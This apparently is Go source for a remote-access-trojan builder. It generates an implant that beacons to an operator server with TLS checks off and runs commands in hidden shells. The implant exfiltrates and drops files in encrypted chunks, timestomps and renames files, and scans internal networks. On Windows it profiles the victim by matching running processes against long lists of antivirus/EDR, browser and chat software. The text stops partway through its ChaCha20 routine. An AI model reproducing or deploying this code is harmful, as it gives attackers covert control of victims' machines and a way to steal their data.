package client
import (
	"regexp"
)
func Generate_agent(protocol, os, server, Path, ConnPath, MsgPath,
	switch_key,encry_key,download,result,_net,
    info,upload,list,option,Username,user,uid,hostname,
	keyPart,filekey,code,base_rounds,windows_pro string) string {
	//如果参数有一个为空
    if protocol == "" || os == "" || server == "" || Path == "" || ConnPath == "" || MsgPath == "" || switch_key == "" || encry_key == "" || download == "" || result == "" || _net == "" || info == "" || upload == "" || list == "" || option == "" || code == "" || base_rounds == "" {
        return "parameter null"
    }
    var protocol_str, os_str, main_str, sys_str, tls_str,package_str,send string
	if protocol == "https" {
		protocol_str = "TLSClientConfig: &tls.Config{InsecureSkipVerify: true,},"
		tls_str = `"crypto/tls"`
	} else {
		tls_str = ""
	}
	if os == "win" {
		os_str = `var flag string; if strings.HasSuffix(strings.ToLower(version), "powershell") { flag = "-Command" } else { flag = "/C" }; command := exec.Command(version, flag, cmd); command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}; var stdout, stderr bytes.Buffer; command.Stdout = &stdout; command.Stderr = &stderr; err := command.Run(); if err != nil && stderr.Len() > 0 { return stderr.String() }; return stdout.String()`
		sys_str = `"syscall"`
	} else {
		os_str = `cmdObj := exec.Command(version, "-c", cmd);result, err := cmdObj.CombinedOutput();if err != nil {return ""};return string(result)`
		sys_str = ""
	}
	if os == "android" {
		main_str = ""
        package_str = "run"
	} else {
		main_str = "func main(){run()}"
        package_str = "main"
	}
    if windows_pro == "group_pro" && os == "win" {
        send = `
type AntivirusProcess struct {
	ProcessName string
	DisplayName string
}
var antivirusList = []AntivirusProcess{
    {"360tray.exe", "360 Safe Guard"},
    {"360sd.exe", "360 Antivirus"},
    {"a2guard.exe", "a-squared Antivirus"},
    {"ad-watch.exe", "Lavasoft Antivirus"},
    {"cleaner8.exe", "The Cleaner Antivirus"},
    {"vba32lder.exe", "VB32 Antivirus"},
    {"MongoosaGUI.exe", "Mongoosa Antivirus"},
    {"CorantiControlCenter32.exe", "Coranti2012 Antivirus"},
    {"F-PROT.EXE", "F-PROT Antivirus"},
    {"CMCTrayIcon.exe", "CMC Antivirus"},
    {"K7TSecurity.exe", "K7 Antivirus"},
    {"UnThreat.exe", "UnThreat Antivirus"},
    {"CKSoftShiedAntivirus4.exe", "Shield Antivirus"},
    {"AVWatchService.exe", "VIRUSfighter Antivirus"},
    {"ArcaTasksService.exe", "ArcaVir Antivirus"},
    {"iptray.exe", "Immunet Antivirus"},
    {"PSafeSysTray.exe", "PSafe Antivirus"},
    {"nspupsvc.exe", "nProtect Antivirus"},
    {"SpywareTerminatorShield.exe", "SpywareTerminator Antivirus"},
    {"BKavService.exe", "Bkav Antivirus"},
    {"MsMpEng.exe", "Microsoft Security Essentials"},
    {"SBAMSvc.exe", "VIPRE"},
    {"ccSvcHst.exe", "Norton Antivirus"},
    {"QQ.exe", "QQ"},
    {"f-secure.exe", "F-Secure"},
    {"avp.exe", "Kaspersky"},
    {"KvMonXP.exe", "Jiangmin Antivirus"},
    {"RavMonD.exe", "Rising Antivirus"},
    {"Mcshield.exe", "McAfee"},
    {"egui.exe", "NOD32"},
    {"kxetray.exe", "Kingsoft Antivirus"},
    {"knsdtray.exe", "Keniu Antivirus"},
    {"avcenter.exe", "Avira (Red Umbrella)"},
    {"ashDisp.exe", "Avast Internet Security"},
    {"rtvscan.exe", "Norton Antivirus"},
    {"ksafe.exe", "Kingsoft Guard"},
    {"QQPCRTP.exe", "QQ PC Manager"},
    {"Miner.exe", "Miner"},
    {"AYAgent.aye", "Capsule Korea"},
    {"patray.exe", "AhnLab"},
    {"V3Svc.exe", "AhnLab V3"},
    {"avgwdsvc.exe", "AVG Antivirus"},
    {"ccSetMgr.exe", "Symantec"},
    {"QUHLPSVC.EXE", "QUICK HEAL Antivirus"},
    {"mssecess.exe", "Microsoft Antivirus"},
    {"SavProgress.exe", "Sophos Antivirus"},
    {"fsavgui.exe", "F-Secure Antivirus"},
    {"vsserv.exe", "Bitdefender"},
    {"remupd.exe", "Panda Security"},
    {"FortiTray.exe", "Fortinet"},
    {"safedog.exe", "SafeDog"},
    {"parmor.exe", "Trojan Star"},
    {"beikesan.exe", "Shell Security"},
    {"KSWebShield.exe", "Kingsoft Web Shield"},
    {"TrojanHunter.exe", "Trojan Hunter"},
    {"GG.exe", "Juden Game Shield"},
    {"adam.exe", "Green Eagle Security"},
    {"AST.exe", "Super Patrol"},
    {"ananwidget.exe", "Mozhe Security Expert"},
    {"AVK.exe", "GData"},
    {"ccapp.exe", "Symantec Norton"},
    {"avg.exe", "AVG Anti-Virus"},
    {"spidernt.exe", "Dr.Web"},
    {"Mcshield.exe", "McAfee"},
    {"avgaurd.exe", "Avira Antivir"},
    {"F-PROT.exe", "F-Prot AntiVirus"},
    {"vsmon.exe", "ZoneAlarm"},
    {"avp.exee", "Kaspersky"},
    {"cpf.exe", "Comodo"},
    {"outpost.exe", "Outpost Firewall"},
    {"rfwmain.exe", "Rising Firewall"},
    {"kpfwtray.exe", "Kingsoft Web Guard"},
    {"FYFireWall.exe", "Fengyun Firewall"},
    {"MPMon.exe", "MicroPoint Active Defense"},
    {"pfw.exe", "SkyNet Firewall"},
    {"S.exe", "Chicken Catcher"},
    {"1433.exe", "Scanning 1433"},
    {"DUB.exe", "Brute Force"},
    {"ServUDaemon.exe", "Found S-U"},
    {"BaiduSdSvc.exe", "Baidu Antivirus"},
    {"bdservicehost.exe", "Bitdefender"},
    {"bdagent.exe", "Bitdefender Agent"},
    {"avengine.exe", "TotalAV"},
    {"avgui.exe", "AVG UI"},
    {"avastui.exe", "Avast UI"},
    {"savservice.exe", "Sophos Endpoint"},
    {"tmccsf.exe", "Trend Micro Core Service"},
    {"NisSrv.exe", "Microsoft Defender SmartScreen"},
    {"mfemms.exe", "McAfee Endpoint Security"},
    {"mfetp.exe", "McAfee Exploit Prevention"},
    {"mfevtps.exe", "McAfee Validation Trust Protection"},
    {"swi_service.exe", "Webroot SecureAnywhere"},
    {"f-secure.exe", "F-Secure Anti-Virus"},
    {"vsservppl.exe", "Bitdefender Protected Process"},
    {"zamsvc.exe", "Zemana AntiMalware"},
    {"mbam.exe", "Malwarebytes"},
    {"mbamservice.exe", "Malwarebytes Service"},
    {"msmpeng.exe", "Windows Defender"},
    {"MpDefenderCoreService", "Windows Defender"},
    {"windefend.exe", "Windows Defender Service"},
    {"drweb32wrt.exe", "Dr.Web Scanner"},
    {"dwengine.exe", "Doctor Web Engine"},
    {"clamd.exe", "ClamAV Daemon"},
    {"clamtray.exe", "ClamWin Antivirus"},
    {"immunetprotect.exe", "Immunet Protect"},
    {"emsisoft.exe", "Emsisoft Anti-Malware"},
    {"esets.exe", "ESET Service"},
    {"ekrn.exe", "ESET NOD32 Kernel"},
    {"egui.exe", "ESET GUI"},
    {"cyserver.exe", "Cylance Smart Antivirus"},
    {"cytray.exe", "Cylance UI"},
    {"SentinelAgent.exe", "SentinelOne Agent"},
    {"csfalconservice.exe", "CrowdStrike Falcon Sensor"},
    {"SophosFS.exe", "Sophos File Scanner"},
    {"SophosHealth.exe", "Sophos Health Service"},
    {"SophosUI.exe", "Sophos UI"},
    {"SEP.exe", "Symantec Endpoint Protection"},
    {"sngui.exe", "Sophos Network GUI"},
    {"xagt.exe", "FireEye Agent"},
    {"tmproxy.exe", "TrendMicro Proxy Service"},
    {"avkcl.exe", "GData AVK"},
    {"trjscan.exe", "Trojan Remover"},
    {"webproxy.exe", "Web Security Agent"},
    {"mcshield.exe", "McAfee Scanner"},
    {"pccntmon.exe", "Trend Micro Monitor"},
}
type BrowserProcess struct {
    ProcessName string // Executable process name
    DisplayName string // Browser display name
}

var browserList = []BrowserProcess{
    {"chrome.exe", "Google Chrome"},
    {"msedge.exe", "Microsoft Edge"},
    {"firefox.exe", "Mozilla Firefox"},
    {"opera.exe", "Opera"},
    {"brave.exe", "Brave Browser"},
    {"vivaldi.exe", "Vivaldi"},
    {"iexplore.exe", "Internet Explorer"},
    {"safari.exe", "Apple Safari"},
    {"chromium.exe", "Chromium Browser"},
    {"maxthon.exe", "Maxthon Browser"},
    {"qqbrowser.exe", "QQ Browser"},
    {"ucbrowser.exe", "UC Browser"},
    {"2345Explorer.exe", "2345 Explorer"},
    {"liebao.exe", "Cheetah Browser"},
    {"sebrowser.exe", "Sogou High-Speed Browser"},
    {"baidubrowser.exe", "Baidu Browser"},
    {"360se.exe", "360 Safe Browser"},
    {"360chrome.exe", "360 Extreme Browser"},
    {"yandex.exe", "Yandex Browser"},
    {"tor.exe", "Tor Browser"},
    {"avastbrowser.exe", "Avast Secure Browser"},
    {"coc_coc_browser.exe", "Cốc Cốc Browser"},
    {"k-meleon.exe", "K-Meleon"},
    {"midori.exe", "Midori"},
    {"waterfox.exe", "Waterfox"},
    {"palemoon.exe", "Pale Moon"},
    {"slimbrowser.exe", "SlimBrowser"},
    {"comodo_dragon.exe", "Comodo Dragon"},
    {"torch.exe", "Torch Browser"},
}
type ChatApp struct {
    ProcessName string // Executable process name
    DisplayName string // Display name
}
var ChatAppList = []ChatApp{
    // 🟦 Domestic chat software
    {"QQ.exe", "QQ"},
    {"Weixin.exe", "WeChat"},
    {"TIM.exe", "TIM"},
    {"AliIM.exe", "AliWangwang"},
    {"DingTalk.exe", "DingTalk"},
    {"Feishu.exe", "Feishu"},
    {"RTX.exe", "RTX Tencent Talk"},

    // 🟦 Foreign chat software
    {"Telegram.exe", "Telegram"},
    {"WhatsApp.exe", "WhatsApp"},
    {"Signal.exe", "Signal"},
    {"Skype.exe", "Skype"},
    {"Zoom.exe", "Zoom"},
    {"Slack.exe", "Slack"},
    {"Discord.exe", "Discord"},
    {"MicrosoftTeams.exe", "Microsoft Teams"},
    {"Viber.exe", "Viber"},
    {"Line.exe", "LINE"},
    {"ICQ.exe", "ICQ"},
    {"Trillian.exe", "Trillian"},
}
func getMACAddresses() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "00:00:00:00:00:00"
	}
	var macs []string
	for _, iface := range interfaces {
		mac := iface.HardwareAddr.String()
		if mac != "" {
			macs = append(macs, mac)
		}
	}
	return strings.Join(macs, ",")
}
func getCPUFromRegistry() string {
    k,err := registry.OpenKey(registry.LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", registry.QUERY_VALUE)
    if err != nil {
        return ""
    }
    defer k.Close()

    cpuName, _, err := k.GetStringValue("ProcessorNameString")
    if err != nil {
        return ""
    }
    return cpuName
}
func matchAntivirus(lowerSet map[string]bool) string {
	var ant []string
	for _, av := range antivirusList {
		if lowerSet[strings.ToLower(av.ProcessName)] {
			ant = append(ant, av.DisplayName)
		}
	}
	return strings.Join(ant, ",")
}
func matchBrowsers(lowerSet map[string]bool) string {
	var bro []string
	for _, browser := range browserList {
		if lowerSet[strings.ToLower(browser.ProcessName)] {
			bro = append(bro, browser.DisplayName)
		}
	}
	return strings.Join(bro, ",")
}
func matchChatApps(lowerSet map[string]bool) string {
	var apps []string
	for _, chat := range ChatAppList {
		if lowerSet[strings.ToLower(chat.ProcessName)] {
			apps = append(apps, chat.DisplayName)
		}
	}
	return strings.Join(apps, ",")
}
func getWindowsVersion() string {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
	if err != nil {
		return "unknown"
	}
	defer key.Close()
	productName, _, err := key.GetStringValue("ProductName")
	if err != nil {
		return "unknown"
	}
	return productName
}
func getProcess_list() []string {
	processes,_:= process.Processes()
	var names []string
	for _, p := range processes {
		name, err := p.Name()
		if err == nil && name != "" {
			names = append(names, name)
		}
	}
	return names
}
func send() {
    Process_win := getProcess_list()
    lowerSet := make(map[string]bool)
    for _, p := range Process_win {
        lowerSet[strings.ToLower(p)] = true
    }
    macs := getMACAddresses()
    cpuInfo := getCPUFromRegistry()
    Antivirus := matchAntivirus(lowerSet)
    Browsers := matchBrowsers(lowerSet)
    ChatApps := matchChatApps(lowerSet)
    vmStat, _ := mem.VirtualMemory()
    systemType := getWindowsVersion()
    Arm := "x64"
    usedGB := strconv.FormatFloat(float64(vmStat.Used)/(1024*1024*1024), 'f', 1, 64)
    totalGB := strconv.FormatFloat(float64(vmStat.Total)/(1024*1024*1024), 'f', 1, 64)
    percent := strconv.FormatFloat(vmStat.UsedPercent, 'f', 0, 64)
    memoryStr := usedGB + "/" + totalGB + " GB (" + percent + "%)"

    re_url := protocol + master + "//*Path*/?/*option*/=/*info*/"
    currentDir, _:= os.Getwd()
    currentDir = strings.ReplaceAll(currentDir, "\\", "/")
    parts := strings.Split(master, ":")
    add_str := clientname +"^"+ user +"^"+ osname +"^"+ strconv.Itoa(int(delay)) +"^"+ getInternalIPs() +"^"+ currentDir +"^"+ version +"^"+ parts[1] +"^"+ protocol +"^"+ strconv.Itoa(int(jitter))+"^"+ executable +"^"+ macs +"^"+ cpuInfo +"^"+ Antivirus +"^"+ Browsers +"^"+ ChatApps +"^"+ memoryStr +"^"+ systemType +"^"+ Arm
    encry_str := get_encry_s(&add_str)
    data:= map[string]string{"/*uid*/":uid,"/*result*/":encry_str}
    post(data, re_url)
}
    `
    }else{
        send = `
        func send() {
            re_url := protocol + master + "//*Path*/?/*option*/=/*info*/"
            currentDir, _:= os.Getwd()
            currentDir = strings.ReplaceAll(currentDir, "\\", "/")
            parts := strings.Split(master, ":")
            add_str := clientname +"^"+ user +"^"+ osname +"^"+ strconv.Itoa(int(delay)) +"^"+ getInternalIPs() +"^"+ currentDir +"^"+ version +"^"+ parts[1] +"^"+ protocol +"^"+ strconv.Itoa(int(jitter))+"^"+ executable
            encry_str := get_encry_s(&add_str)
            data:= map[string]string{"/*uid*/":uid,"/*result*/":encry_str}
            post(data, re_url)
        }
        `
    }
	protocol_var :="\""+protocol + "://\""
    s_server := "\""+server+"\""
    u_username := "\""+Username+"\""
    o_os := "\""+os+"\""
    templateStr := `
    package /*package_str*/
    import (
        "math"
        "bytes"
        "math/rand"
        "io"
        "io/ioutil"
        "net/http"
        "net"
        "os"
        "os/exec"
        "strings"
        "time"
        "mime/multipart"
        "strconv"
        "sync"
        "path/filepath"
        "encoding/binary"
        /*sys_str*/
        /*tls_str*/
    )
    var(
        osname = /*os*/
        protocol = /*protocol_var*/
        uid string
        version string
        clientname string
        executable string
        delay int8 = 30
        waitTime int = 3
        jitter int = 5
        base_rounds string = "/*base_rounds*/"
        decodeMap  = make(map[byte]int)
        onece bool = true
        user string = /*Username*/
        master string = /*server*/
        key string
        get_headers map[string]string= map[string]string{"Accept":"q=0.7;text/html,application/xhtml+xml","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
        post_headers map[string]string= map[string]string{"Content-Type":"application/json","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Cache-Control":"max-age=0","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
        keyPartArr []int
        transport http.RoundTripper
        client *http.Client
        file_byte_parts = make(map[string][]byte)
    )
    /*main_str*/
    func initHttpClient() {
        transport = &http.Transport{
            MaxIdleConnsPerHost: 100,
            MaxIdleConns:        100,
            IdleConnTimeout:     5,
            DisableKeepAlives:   false,
            DialContext: (&net.Dialer{
                Timeout:   30 * time.Second,
                KeepAlive: 30 * time.Second,
            }).DialContext,
            /*protocol_str*/
        }
        client = &http.Client{
            Transport: transport,
            Timeout:   30 * time.Second,
        }
    }
    func getUrl(url string) string {
        var resp *http.Response
        req, err := http.NewRequest("GET", url, nil)
        if err != nil {
            delay = 35
            time.Sleep(time.Duration(waitTime) * time.Second)
            run()
        }
        for key, value := range get_headers {
            req.Header.Set(key, value)
        }
        resp, err = client.Do(req)
        if err != nil {
            delay = 35
            time.Sleep(time.Duration(waitTime) * time.Second)
            run()
        }
        respBody, err := ioutil.ReadAll(resp.Body)
        if err != nil {
            delay = 35
            resp.Body.Close()
            time.Sleep(time.Duration(waitTime) * time.Second)
            run()
        }
        resp.Body.Close()
        if len(respBody) == 0 {
            return ""
        }
        return strings.TrimSpace(string(respBody)) // 成功返回响应
    }
    func post(data map[string]string, re_url string) {
        var formStr strings.Builder
        for key, value := range data {
            // 注意需要对 key 和 value 进行 url 编码
            formStr.WriteString(urlEncode(key))
            formStr.WriteString("=")
            formStr.WriteString(urlEncode(value))
            formStr.WriteString("&")
        }
        formData := formStr.String()
        if len(formData) > 0 {
            formData = formData[:len(formData)-1] // 去掉最后一个 &
        }
        req, err := http.NewRequest("POST", re_url, strings.NewReader(formData))
        if err != nil {
            delay = 35
            time.Sleep(time.Duration(waitTime) * time.Second)
            run()
        }
        req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
        for key, value := range post_headers {
            if key != "Content-Type" {
                req.Header.Set(key, value)
            }
        }
        resp, err := client.Do(req)
        if err != nil {
            delay = 35
            time.Sleep(time.Duration(waitTime) * time.Second)
            run()
        }
        resp.Body.Close()
        return
    }
    // urlEncode 只用标准库，不依赖 url.Values
    func urlEncode(s string) string {
        hexChars := "0123456789ABCDEF"
        var buf strings.Builder
        for i := 0; i < len(s); i++ {
            c := s[i]
            if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~' {
                buf.WriteByte(c)
            } else {
                buf.WriteByte('%')
                buf.WriteByte(hexChars[c>>4])
                buf.WriteByte(hexChars[c&0x0F])
            }
        }
        return buf.String()
    }
    // 下载并解密文件
    func downloadFile(re_url, fileKey string) {
        encryData := get_encry_s(&fileKey)
        url := protocol + master + "//*Path*/?/*option*/=/*download*/&/*uid*/=" + uid + "&/*filekey*/=" + encryData
        filesplit := strings.Split(fileKey, "*")
        if len(filesplit) < 3{
            delete(file_byte_parts, fileKey)
            return
        } 
        filename := filesplit[1]
        var fullData []byte
        for {
            response, err := http.Get(url)
            if err != nil {
                delete(file_byte_parts, fileKey)
                return
            }
            fileData, err := io.ReadAll(response.Body)
            response.Body.Close()
            if err != nil {
                delete(file_byte_parts, fileKey)
                return
            }
            if len(fileData) == 0 {
                break
            }
            fullData = append(fullData, fileData...)
            time.Sleep(time.Duration(delay) * time.Second)
        }
        file_byte_parts[fileKey] = fullData
        if err := get_encry_f(filename, fileKey); err != nil {
            return
        }
    }
    // 上传
    func GET_U_FILE(cmd, splitSize string) {
        intSize, _ := strconv.Atoi(splitSize)
        fileContent, _ := get_decry_f(cmd)
        fileSize := len(fileContent)
        start := 0 
        end := intSize       
        for start < fileSize {
            if end > fileSize {
                end = fileSize
            }
            str_encry := user + "^" + splitSize + "^" + strconv.Itoa(fileSize) + "^" + strconv.Itoa(start) + "^" + strconv.Itoa(end)
            data_encry := get_encry_s(&str_encry)
            chunk := fileContent[start:end]
            var buffer bytes.Buffer
            writer := multipart.NewWriter(&buffer)
            part, _ := writer.CreateFormFile("/*upload*/", get_encry_s(&cmd)) // 使用实际的文件名
            io.Copy(part, bytes.NewReader(chunk))
            writer.WriteField("/*uid*/", uid)
            writer.WriteField("/*result*/", data_encry)
            writer.Close()
            url := protocol + master + "//*Path*/?/*option*/=/*upload*/"
            req, _ := http.NewRequest("POST", url, &buffer)
            req.Header.Set("Content-Type", writer.FormDataContentType())
            req.Header.Set("Range", "bytes"+strconv.Itoa(start)+"-"+strconv.Itoa(end-1))
            resp,err := client.Do(req)
            if err != nil {
                return
            }
            resp.Body.Close()
            if resp.StatusCode != http.StatusOK {
                return
            }
            start = end
            end = start + intSize
            time.Sleep(time.Duration(delay) * time.Second)
        }
    }
    func getCmd() {
        url := protocol + master + "//*Path*/?/*option*/=/*MsgPath*/&/*uid*/=" + uid
        re_url := protocol + master + "//*Path*/?/*option*/=/*result*/"
        file_url := protocol + master + "//*Path*/?/*option*/=/*list*/"
        var job, shell,taskid string
        var msg []string
        for {
            wait := int(delay)
            if delay > 30 {
                wait += rand.Intn(jitter + 1)
            }
            time.Sleep(time.Duration(wait) * time.Second)
            respBody := getUrl(url)
            if respBody == "" {
                continue
            } else if respBody == uid {
                onece = true
                run()
            }
            cmd := get_decry_s(&respBody)
            msg = strings.Split(cmd, "^")
            if len(msg) < 2 {
                continue
            }
            job, taskid = msg[0], msg[len(msg)-1]
            msg_cmd := strings.Join(msg[:len(msg)-1], "^")
            if len(msg) > 1 {
                shell = string(msg[1])
            }
            switch job {
            case "GET_U_FRIENDS":
                go scan_u_firends(msg[1], msg[2], msg[3], msg[4], "ping")
            case "GET_DELAY":
                GET_DELAY(msg[1])
            case "GET_JITTER":
                GET_JITTER(msg[1])
            case "GET_U_FILE":
                go GET_U_FILE(msg[1], msg[2])
            case "LOAD_U_FILE":
                go downloadFile(re_url, msg[1])
            case "LOOK_UP_FILE":
                listDir(shell, file_url,taskid)
            case "GET_PORTS":
                go scan_u_firends(msg[1], msg[2], msg[3], msg[4], "port")
            case "SWITCH_VERSION":
                version = shell
            case "CHANG_FILE_NAME":
                CHANG_FILE_NAME(msg[1], msg[2])
            case "CHANG_FILE_TIME":
                CHANG_FILE_TIME(msg[1], msg[2])
            /*code*/
            default:
                go get_Command(msg_cmd, re_url,taskid)
            }
        }
    }
    func get_Command(cmd,re_url,taskid string) {
        result := Command(cmd)
        if result != "" {
            encry_result := get_encry_s(&result)
            if encry_result == "" {
                encry_result = "error"
            }
            data:= map[string]string{
                "/*uid*/": uid,
                "/*result*/": encry_result,
                "/*info*/": taskid,
            }
            post(data, re_url)
        }
        return
    }
    func Command(cmd string) string {
        /*os_str*/
    }
    func CHANG_FILE_TIME(cmd, newTime string) {
        var str string
        info, err := os.Stat(cmd)
        if err != nil || info.IsDir() {
            str = "CHANG_FILE_TIME^ file not found or is a directory"
        } else {
            cleanTime := strings.ReplaceAll(strings.TrimSpace(newTime), "\r", "")
            modTime, err := time.Parse("2006-01-02 15:04:05", cleanTime)
            if err != nil {
                str = "CHANG_FILE_TIME^ invalid time format"
            } else {
                if err := os.Chtimes(cmd, modTime, modTime); err != nil {
                    str = "CHANG_FILE_TIME^ failed to change file time: " + err.Error()
                } else {
                    str = "CHANG_FILE_TIME^" + newTime
                }
            }
        }
        fileKey := get_encry_s(&str)
        data := map[string]string{
            "/*uid*/":    uid,
            "/*result*/": fileKey,
        }
        re_url := protocol + master + "//*Path*/?/*option*/=/*result*/"
        post(data, re_url)
    }
    func CHANG_FILE_NAME(cmd, newName string) {
        var str string
        if _, err := os.Stat(cmd); os.IsNotExist(err) {
            str = "CHANG_FILE_NAME^ file not found"
        } else {
            dir := filepath.Dir(cmd)
            newPath := filepath.Join(dir, newName)

            if err := os.Rename(cmd, newPath); err != nil {
                str = "CHANG_FILE_NAME^ failed to rename file: " + err.Error()
            } else {
                str = "CHANG_FILE_NAME^" + newName
            }
        }
        fileKey := get_encry_s(&str)
        data := map[string]string{
            "/*uid*/":    uid,
            "/*result*/": fileKey,
        }
        re_url := protocol + master + "//*Path*/?/*option*/=/*result*/"
        post(data, re_url)
    }
    func listDir(cmd, file_url,taskid string) {
        var fileNames string
        files, _ := ioutil.ReadDir(cmd)
        for _, file := range files {
            modTime := file.ModTime()
            modTimeStr := modTime.Format("2006-01-02 15:04:05")
            permissions := file.Mode().String()
            if file.IsDir() {
                fileNames += "dir " + file.Name() + "<" + permissions + "><" + modTimeStr + ">\n"
            } else {
                fileSize := file.Size()
                fileSizeMB := float64(fileSize) / (1024 * 1024)
                fileSizeStr := strconv.FormatFloat(fileSizeMB, 'f', 2, 64)
                fileNames += "fil " + file.Name() + "<" + fileSizeStr + ".MB><" + permissions + "><" + modTimeStr + ">\n"
            }
        }
        if fileNames == "" {
            fileNames = "empty"
        }
        fileData := cmd + "^" + fileNames
        encryptedStr := get_encry_s(&fileData)
        data := map[string]string{
            "/*uid*/":  uid,
            "/*result*/": encryptedStr,
            "/*info*/": taskid,
        }
        post(data, file_url)
    }
    func GET_JITTER(s_jitter string) {
        parsedJitter, _ := strconv.Atoi(s_jitter)
        jitter = parsedJitter
    }
    func GET_DELAY(s_delay string) {
        parsedTime, _ := strconv.ParseInt(s_delay, 10, 8)
        delay = int8(parsedTime)
        if t, ok := transport.(*http.Transport); ok {
            if delay >= 30 {
                t.IdleConnTimeout = 5 * time.Second
            } else {
                t.IdleConnTimeout = 0
            }
        }
        return
    }
    func split_comment(portList string)[]string{
        var temp_split []string
        var port_list []string
        if strings.Contains(portList, ",") {
            temp_split = strings.Split(portList, ",")
            return temp_split
        } else if strings.Contains(portList, "-") {
            temp_split = strings.Split(portList, "-")
            start_port,_:= strconv.Atoi(temp_split[0])
            end_port,_:= strconv.Atoi(temp_split[1])
            for i := start_port; i <= end_port; i++ {
                str:=strconv.Itoa(i)
                port_list = append(port_list, str)
            }
        } else {
            port_list = append(port_list, portList)
            return port_list
        }
        return port_list
    }
    func scan_u_firends(ip, portList, delay, choice, option string) {
        var resultBuilder strings.Builder
        var mutex sync.Mutex
        var open_ports, re_url string
        port_list := split_comment(portList)
        if len(port_list) > 65535 {
            return
        }
        sleep_time, _ := strconv.Atoi(delay)
        if option == "port" {
            for _, port := range port_list {
                time.Sleep(time.Duration(sleep_time) * time.Second)
                scan_port(ip, port, sleep_time,&resultBuilder, &mutex)
            }
        } else if option == "ping" {
            ip_split := strings.Split(ip, ".")
            new_ip := strings.Join(ip_split[:3], ".") + "."
            ping_list := split_comment(ip_split[3])
            if len(ping_list) > 255 {
                return
            }
            for _, i := range ping_list {
                target := new_ip + i
                for _, p := range port_list {
                    time.Sleep(time.Duration(sleep_time) * time.Second)
                    scan_port(target, p, sleep_time,&resultBuilder, &mutex)
                }
            }
        }
        open_ports = resultBuilder.String()
        encrypted_data := get_encry_s(&open_ports)
        data := map[string]string{
            "/*uid*/":    uid,
            "/*result*/": encrypted_data,
        }
        if choice == "save" {
            re_url = protocol + master + "//*Path*/?/*option*/=/*_net*/"
        } else {
            re_url = protocol + master + "//*Path*/?/*option*/=/*result*/"
        }
        post(data, re_url)
    }
    
    func scan_port(ip, port string, sleep_time int, resultBuilder *strings.Builder, mutex *sync.Mutex) {
        sleepTime := time.Duration(sleep_time) * time.Second
        conn, err := net.DialTimeout("tcp", ip+":"+port, sleepTime)
        if err != nil {
            return // 无法连接，说明端口未开放
        }
        defer conn.Close()
        // 尝试读取 banner，但不强求
        conn.SetReadDeadline(time.Now().Add(sleepTime))
        buf := make([]byte, 128)
        n, _ := conn.Read(buf) // 忽略错误
        banner := ""
        if n > 0 {
            banner = string(buf[:n])
        }
        var target string
        if banner == "" {
            target = ip + ":[" + port + "]"
        } else {
            target = ip + ":[" + port + " - {{{" + banner + "}}}]"
        }

        mutex.Lock()
        resultBuilder.WriteString(target + "\n")
        mutex.Unlock()
    }
    func getInternalIPs() string {
        var ips []string
        interfaces, _ := net.Interfaces()
        for _, iface := range interfaces {
            if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
                continue
            }
            addrs, _ := iface.Addrs()
            for _, addr := range addrs {
                var ip net.IP
                switch v := addr.(type) {
                case *net.IPNet:
                    ip = v.IP
                case *net.IPAddr:
                    ip = v.IP
                }
                if ip != nil && ip.To4() != nil {
                    ips = append(ips, ip.String())
                }
            }
        }
        return strings.Join(ips, ",")
    }
    /*send*/
    //chacha20算法实现
    func rotl(x, n uint32) uint32 {
        return (x << n) | (x >> (32 - n))
    }
    func quarterRound(a, b, c, d uint32) (uint32, uint32, uint32, uint32) {
        a += b
        d ^= a
        d = rotl(d, 16)
        c += d
        b ^= c
        b = rotl(b, 12)
        a += b
        d ^= a
        d = rotl(d, 8)
        c += d
        b ^= c
        b = rotl(b, 7)
        return a, b, c, d
    }
    func initializeState(key [32]byte, counter uint32, nonce [12]byte) [16]uint32 {
        state := [16]uint32{
            0x61707865, 0x3320646e, 0x79622d32, 0x6b206574, // "expand 32-byte k"
            binary.LittleEndian.Uint32(key[0:4]),
            binary.LittleEndian.Uint32(key[4:8]),
            binary.LittleEndian.Uint32(key[8:12]),
            binary.LittleEndian.Uint32(key[12:16]),
            binary.LittleEndian.Uint32(key[16:20]),
            binary.LittleEndian.Uint32(key[20:24]),
            binary.LittleEndian.Uint32(key[24:28]),
            binary.LittleEndian.Uint32(key[28:32]),
            counter,
            binary.LittleEndian.Uint32(nonce[0:4]),
            binary.LittleEndian.Uint32(nonce[4:8]),
            binary.LittleEndian.Uint32(nonce[8:12]),
        }
        return state
    }
    func chacha20Block(key [32]byte, counter uint32, nonce [12]byte) [64]byte {
        state := initializeState(key, counter, nonce)
        workingState := state
        for round := 0; round < 10; round++ {
            idxs := [4][4]int{
                {0, 4, 8, 12},
                {1, 5, 9, 13},
                {2, 6, 10, 14},
                {3, 7, 11, 15},
            }
            for i := 0; i < 4; i++ {
                a, b, c, d := workingState[idxs[i][0]], workingState[idxs[i][1]], workingState[idxs[i][2]], workingState[idxs[i][3]]
                a, b, c, d = quarterRound(a, b, c, d)
                workingState[idxs[i][0]], workingState[idxs[i][1]], workingState[idxs[i][2]], workingState[idxs[i][3]] = a, b, c, d
            }
            diags := [4][4]int{
                {0, 5, 10, 15},
                {1, 6, 11, 12},
                {2, 7, 8, 13},
                {3, 4, 9, 14},
            }
            for i := 0; i < 4; i++ {
                a, b, c, d := workingState[diags[i][0]], workingState[diags[i][1]], workingState[diags[i][2]], workingState[diags[i][3]]
                a, b, c, d = quarterRound(a, b, c, d)
